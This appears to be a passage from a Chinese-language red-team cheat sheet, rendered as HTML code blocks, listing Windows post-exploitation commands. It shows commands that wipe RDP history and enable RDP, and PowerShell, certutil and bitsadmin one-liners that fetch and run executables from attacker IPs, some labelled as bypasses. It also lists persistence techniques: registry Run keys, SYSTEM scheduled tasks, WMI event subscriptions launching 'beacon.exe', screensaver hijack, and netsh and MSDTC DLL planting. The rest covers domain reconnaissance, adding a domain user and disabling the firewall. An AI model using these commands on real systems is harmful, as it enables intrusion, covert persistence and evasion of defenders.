class="hljs-number">2</span>dafd<span class="hljs-number">1669e37131</span>***<br><br></code></pre></td></tr></table></figure>



<h2 id="删rdp日志"><a href="#删rdp日志" class="headerlink" title="删rdp日志"></a>删rdp日志</h2><p>清除远程桌面连接记录,创建clear.bat</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">@echo off<br><span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot;</span> /va /<span class="hljs-keyword">f</span><br><span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;</span> /<span class="hljs-keyword">f</span><br><span class="hljs-keyword">reg</span> <span class="hljs-built_in">add</span> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;</span><br><span class="hljs-keyword">cd</span> %userprofile%\documents\attrib Default.rdp -s -h<br>del Default.rdp<br></code></pre></td></tr></table></figure>


<h2 id="开3389"><a href="#开3389" class="headerlink" title="开3389"></a>开3389</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">系统windows <span class="hljs-keyword">server</span> <span class="hljs-number">2003</span>后<br>wmic /namespace:\root\cimv2\terminalservices <span class="hljs-type">path</span> win32_terminalservicesetting <span class="hljs-keyword">where</span> (__CLASS != &quot;&quot;) <span class="hljs-keyword">call</span> setallowtsconnections <span class="hljs-number">1</span><br>wmic /namespace:\root\cimv2\terminalservices <span class="hljs-type">path</span> win32_tsgeneralsetting <span class="hljs-keyword">where</span> (TerminalName =<span class="hljs-string">&#x27;RDP-Tcp&#x27;</span>) <span class="hljs-keyword">call</span> setuserauthenticationrequired <span class="hljs-number">1</span><br>reg <span class="hljs-keyword">add</span> &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d <span class="hljs-number">0</span> /f<br>net <span class="hljs-keyword">start</span> TermService<br></code></pre></td></tr></table></figure>

<h2 id="文件查找"><a href="#文件查找" class="headerlink" title="文件查找"></a>文件查找</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">findstr <span class="hljs-string">/s</span> <span class="hljs-string">/i</span> <span class="hljs-string">/n</span> <span class="hljs-string">/d</span><span class="hljs-function">:C</span>:\ <span class="hljs-string">/c</span>:<span class="hljs-string">&quot;123123&quot;</span> *<span class="hljs-string">.txt</span><br></code></pre></td></tr></table></figure>

<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">for</span> /r C: %i <span class="hljs-keyword">in</span> (login.*) <span class="hljs-keyword">do</span> @echo %i<br></code></pre></td></tr></table></figure>

<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">where</span> /R C: <span class="hljs-regexp">login.*</span><br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dir <span class="hljs-regexp">/s/</span>a-d/b login.*<br></code></pre></td></tr></table></figure>

<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">find / -<span class="hljs-keyword">name</span> <span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure>

<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">find / -<span class="hljs-keyword">name</span> <span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure>

<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> / -name <span class="hljs-string">&quot;index.php&quot;</span> | xargs <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;111222&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">进程路径<br>wmic process get name,executablepath<br><br></code></pre></td></tr></table></figure>

<h2 id="powershell文件下载"><a href="#powershell文件下载" class="headerlink" title="powershell文件下载"></a>powershell文件下载</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell (<span class="hljs-built_in">new</span>-<span class="hljs-keyword">object</span> <span class="hljs-keyword">System</span>.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://192.168.1.1/1.exe&#x27;</span>,<span class="hljs-string">&#x27;C:\test\1.exe&#x27;</span>);<span class="hljs-keyword">start</span>-process <span class="hljs-string">&#x27;C:\test\1.exe&#x27;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">powershell (<span class="hljs-keyword">new</span>-<span class="hljs-keyword">object</span> System.Net.WebClient).<span class="hljs-constructor">DownloadFile(&#x27;<span class="hljs-params">http</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>192.168.1.1<span class="hljs-operator">/</span>1.<span class="hljs-params">exe</span>&#x27;,&#x27;1.<span class="hljs-params">exe</span>&#x27;)</span><br></code></pre></td></tr></table></figure>

<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Invoke-Expression (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(&quot;http://xxx.xx.xx.xx/test.ps1&quot;)<br></code></pre></td></tr></table></figure>

<p>bypass</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">echo (<span class="hljs-keyword">new</span>-<span class="hljs-keyword">object</span> System.Net.WebClient).<span class="hljs-constructor">DownloadFile(&#x27;<span class="hljs-params">http</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>192.168.31.93:8000<span class="hljs-operator">/</span><span class="hljs-params">tomcat</span>.<span class="hljs-params">exe</span>&#x27;,&#x27;C:<span class="hljs-operator">/</span>Users<span class="hljs-operator">/</span><span class="hljs-params">test</span><span class="hljs-operator">/</span><span class="hljs-params">cc</span>.<span class="hljs-params">exe</span>&#x27;)</span><span class="hljs-pattern-match">| powershell -</span><br></code></pre></td></tr></table></figure>

<h2 id="certutil-exe下载"><a href="#certutil-exe下载" class="headerlink" title="certutil.exe下载"></a>certutil.exe下载</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>/<span class="hljs-number">1</span>.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">certutil</span>.exe -urlcache -split -f http://<span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">1</span>.txt <span class="hljs-number">1</span>.exe<br></code></pre></td></tr></table></figure>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">6.27</span>:<span class="hljs-number">8012</span>/download/<span class="hljs-keyword">f</span>.ext C:\windows\temp\<span class="hljs-keyword">up</span>.<span class="hljs-keyword">exe</span> &amp;&amp;start C:\windows\temp\<span class="hljs-keyword">up</span>.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>

<p>删除缓存</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>/<span class="hljs-number">1</span>.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">delete</span><br></code></pre></td></tr></table></figure>

<p>查看缓存项目：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">certutil<span class="hljs-selector-class">.exe</span> -urlcache *<br></code></pre></td></tr></table></figure>

<p>转为base64</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">certutil</span> -encode lcx64.exe lcx64.txt<br></code></pre></td></tr></table></figure>

<p>转回来</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">certutil -<span class="hljs-built_in">decode</span> lcx64.txt lcx64.exe<br></code></pre></td></tr></table></figure>

<p>查看md5</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">certutil -hashfile <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.exe</span> MD5<br></code></pre></td></tr></table></figure>

<p>bypass</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">Certutil &amp; Certutil –urlcache –f –<span class="hljs-built_in">split</span> url<br>Certutil | <span class="hljs-type">Certutil</span> –urlcache –f –<span class="hljs-built_in">split</span> url<br></code></pre></td></tr></table></figure>

<h2 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h2><p><strong>不支持https、ftp协议，php python带的服务器会出错</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bitsadmin</span> /transfer n http://<span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">1</span>.exe  C:\test\update\<span class="hljs-number">1</span>.exe<br></code></pre></td></tr></table></figure>


<h2 id="windows权限维持"><a href="#windows权限维持" class="headerlink" title="windows权限维持"></a>windows权限维持</h2><h3 id="Startup目录"><a href="#Startup目录" class="headerlink" title="Startup目录"></a>Startup目录</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livescript">NT6以后的目录如下：<br><br>对当前用户有效：<br>C:<span class="hljs-string">\Users\Username\AppData\Roaming\Microsoft\Windows\Start</span> Menu<span class="hljs-string">\Programs\Startup</span><br>对所有用户有效：<br>C:<span class="hljs-string">\ProgramData\Microsoft\Windows\Start</span> Menu<span class="hljs-string">\Programs\StartUp</span><br>NT6以前的目录如下：<br><br>对当前用户有效：<br>C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\Hunter\「开始」菜单\程序\启动</span><br>对所有用户有效：<br>C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\All</span> Users<span class="hljs-string">\「开始」菜单\程序\启动</span><br><br></code></pre></td></tr></table></figure>

<h3 id="注册键"><a href="#注册键" class="headerlink" title="注册键"></a>注册键</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;XXXX&quot;</span> /v evil /t REG_SZ /d <span class="hljs-string">&quot;[Absolute Path]\evil.exe&quot;</span></span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-number">1</span>.Load注册键<br><span class="hljs-params">HKEY_CURRENT_USER</span>＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load<br><br><span class="hljs-number">2</span>.Userinit注册键<br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit<br>通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。<br><br><span class="hljs-number">3</span>.Explorer＼Run注册键<br>Explorer＼Run键在<span class="hljs-params">HKEY_CURRENT_USER</span>和<span class="hljs-params">HKEY_LOCAL_MACHINE</span>下都有。<br><span class="hljs-params">HKEY_CURRENT_USER</span>＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run<br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run<br>Explorer＼Run键在<span class="hljs-params">HKEY_CURRENT_USER</span>和<span class="hljs-params">HKEY_LOCAL_MACHINE</span>下都有。<br><br><span class="hljs-number">4</span>.RunServicesOnce注册键<br>RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在<span class="hljs-params">HKEY_CURRENT_USER</span>和<span class="hljs-params">HKEY_LOCAL_MACHINE</span>下都有。<br><span class="hljs-params">HKEY_CURRENT_USER</span>＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnce<br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce<br><br><span class="hljs-number">5</span>.RunServices注册键<br>RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。<br><span class="hljs-params">HKEY_CURRENT_USER</span>＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServices<br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices<br><br><span class="hljs-number">6</span>.RunOnce＼Setup注册键<br><span class="hljs-params">HKEY_CURRENT_USER</span>＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup<br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup<br><br><span class="hljs-number">7</span>.RunOnce注册键<br>安装程序通常用RunOnce键自动运行程序，它的位置在<br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce<br>[小于NT6]<span class="hljs-params">HKEY_LOCAL_MACHINE</span>＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceEx<br><span class="hljs-params">HKEY_CURRENT_USER</span>＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce<br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；<span class="hljs-params">HKEY_CURRENT_USER</span>下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。<br><br><span class="hljs-number">8</span>.Run注册键<br><span class="hljs-params">HKEY_CURRENT_USER</span>＼Software＼Microsoft＼Windows＼CurrentVersion＼Run<br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>＼Software＼Microsoft＼Windows＼CurrentVersion＼Run<br>Run是自动运行程序最常用的注册键，<span class="hljs-params">HKEY_CURRENT_USER</span>下面的Run键紧接<span class="hljs-params">HKEY_LOCAL_MACHINE</span>下面的Run键运行，但两者都在处理“启动”文件夹之前。<br></code></pre></td></tr></table></figure>

<h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">sc create evil binpath<span class="hljs-operator">=</span> <span class="hljs-string">&quot;cmd.exe /k [Absolute Path]evil.exe&quot;</span> start<span class="hljs-operator">=</span> <span class="hljs-string">&quot;auto&quot;</span> obj<span class="hljs-operator">=</span> <span class="hljs-string">&quot;LocalSystem&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">SCHTASKS <span class="hljs-regexp">/Create /</span>RU SYSTEM <span class="hljs-regexp">/SC ONSTART /</span>RL HIGHEST <span class="hljs-regexp">/TN \Microsoft\Windows\evil\eviltask /</span>TR C:\Users\hunter\Desktop\evil.exe<br></code></pre></td></tr></table></figure>

<h3 id="WMI事件"><a href="#WMI事件" class="headerlink" title="WMI事件"></a>WMI事件</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="hljs-type">PATH</span> __EventFilter <span class="hljs-keyword">CREATE</span> <span class="hljs-type">Name</span>=&quot;evil&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 310&quot;<br><br>wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="hljs-type">PATH</span> CommandLineEventConsumer <span class="hljs-keyword">CREATE</span> <span class="hljs-type">Name</span>=&quot;evilConsumer&quot;, ExecutablePath=&quot;C:\Users\hunter\Desktop\beacon.exe&quot;,CommandLineTemplate=&quot;C:\Users\hunter\Desktop\beacon.exe&quot;<br><br>wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="hljs-type">PATH</span> __FilterToConsumerBinding <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">Filter</span>=&quot;__EventFilter.Name=\&quot;evil\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;evilConsumer\&quot;&quot;<br><br></code></pre></td></tr></table></figure>

<h3 id="屏幕保护"><a href="#屏幕保护" class="headerlink" title="屏幕保护"></a>屏幕保护</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;hkcu\control panel\desktop&quot;</span> /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /f</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;hkcu\control panel\desktop&quot;</span> /v ScreenSaveActive /d 1 /f</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;hkcu\control panel\desktop&quot;</span> /v ScreenSaverIsSecure /d 0 /f</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;hkcu\control panel\desktop&quot;</span> /v ScreenSaveTimeOut /d 60 /f</span><br></code></pre></td></tr></table></figure>

<h3 id="bitsadmin-1"><a href="#bitsadmin-1" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">bitsadmin <span class="hljs-string">/create</span> evil<br>bitsadmin <span class="hljs-string">/addfile</span> evil <span class="hljs-string">&quot;C:\Users\hunter\Desktop\beacon.exe&quot;</span> <span class="hljs-string">&quot;C:\Users\hunter\Desktop\beacon.exe&quot;</span><br>bitsadmin.exe <span class="hljs-string">/SetNotifyCmdLine</span> evil <span class="hljs-string">&quot;C:\Users\hunter\Desktop\beacon.exe&quot;</span> NUL<br>bitsadmin <span class="hljs-string">/Resume</span> evil<br></code></pre></td></tr></table></figure>

<h3 id="Netsh白加黑"><a href="#Netsh白加黑" class="headerlink" title="Netsh白加黑"></a>Netsh白加黑</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">可以通过导入helperdll的方式做权限维持，命令格式如下：<br>netsh <span class="hljs-keyword">add</span><span class="language-bash"> helper [Absolute evil DLL path]</span><br>但是由于netsh并不会开启自启动，因此还要再写一条自启动项：<br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v Pentestlab /t REG_SZ /d <span class="hljs-string">&quot;cmd /c C:\Windows\System32\netsh&quot;</span></span><br>重新启动后依然可获得<span class="hljs-keyword">shell</span><span class="language-bash">：</span><br></code></pre></td></tr></table></figure>

<h3 id="MSDTC"><a href="#MSDTC" class="headerlink" title="MSDTC"></a>MSDTC</h3><p>在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。<br>默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>qc msdtc<br><span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> msdtc start= auto<br><br></code></pre></td></tr></table></figure>


<h2 id="windows信息收集常用命令"><a href="#windows信息收集常用命令" class="headerlink" title="windows信息收集常用命令"></a>windows信息收集常用命令</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Systeminfo 计算机详细信息(补丁信息)<br><br>Net start 所启动的服务<br><br>Wmic<span class="hljs-built_in"> service </span>list brief 查询本机服务信息<br><br>Tasklist 进程列表<br><br>Wmic startup <span class="hljs-built_in">get</span> command,caption 查看启动该程序信息<br><br>Schtasks /query /fo LIST /v计划任务<br><br>Netstat -ano 根据本机端口开放情况来判断有什么服务、其角色<br><br>Query<span class="hljs-built_in"> user </span>|| qwinsta 查看当前在线用户<br><br>Net session 列出会话<br><br>Net share 查看本机的共享列表<br><br>Wmic share <span class="hljs-built_in">get</span> name,path,status 查看共享列表<br><br>Net<span class="hljs-built_in"> user </span>本地用户<br><br>Net<span class="hljs-built_in"> user </span>kkkk 查看本地用户信息<br><br><br>Net localgroup 本地用户组<br><br>Net localgroup /domain 域用户组<br><br>Net localgroup adminnstrators 本地管理员组成员<br><br>net localgroup adminstrators /domain 查看登陆过主机的管理员<br><br>Wmic useraccount <span class="hljs-built_in">get</span> /all 获取域内用户详细信息<br><br>dsquery<span class="hljs-built_in"> user </span>查看存在的用户<br><br>Net<span class="hljs-built_in"> user </span>/domain 域用户信息<br><br>Net<span class="hljs-built_in"> user </span>kkkk /domain 域用户kkkk信息<br><br>Net<span class="hljs-built_in"> user </span>kent password /<span class="hljs-built_in">add</span> /domain添加域用户<br><br><br>Net<span class="hljs-built_in"> group </span>/domain 域用户组信息<br><br>Net view /domain 查询域<br><br>Net view /domain:test 查询域内计算机<br><br>Net accounts /domain 查询域中密码策略<br><br>Net<span class="hljs-built_in"> group </span>/domain 查看域内所有用户组<br><br>Net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain 查看域控制器组<br><br>Net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Domain computers&quot;</span> /domain 查看域内所有计算机列表<br><br>Net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Domain admins&quot;</span> /domain 查看域内管理员用户<br><br>Net<span class="hljs-built_in"> user </span>/domain kent active:yes 启用域账户<br><br>Net<span class="hljs-built_in"> user </span>/domain kent active:no 禁用域账户<br><br>Nltest /DCLIST:test 查看域中域控制器名<br><br>Wmic useraccount <span class="hljs-built_in">get</span> /all 用户详细信息<br><br>Net<span class="hljs-built_in"> group </span>“Domain Admins” /domain 对应组下的账户信息<br><br>nltest /domain_trusts 获取域信任信息<br><br>net<span class="hljs-built_in"> config </span>workstation 了解本机的配置信息<br><br>Netsh<span class="hljs-built_in"> firewall </span>show<span class="hljs-built_in"> config </span>查看防火墙配置<br><br>Netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off关闭防火墙(windows<span class="hljs-built_in"> server </span>2003后)<br><br>Netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;pass nc&quot;</span> <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=<span class="hljs-string">&quot;C:\nc.exe&quot;</span> 允许指定程序进入(windows<span class="hljs-built_in"> server </span>2003后)<br><br>Netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;allow nc&quot;</span> <span class="hljs-attribute">dir</span>=out <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=<span class="hljs-string">&quot;C:\nc.exe&quot;</span>允许指定程序退出(windows<span class="hljs-built_in"> server </span>2003后)<br><br>Netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow 允许3389连接(windows<span class="hljs-built_in"> server </span>2003后)<br><br>Reg query <span 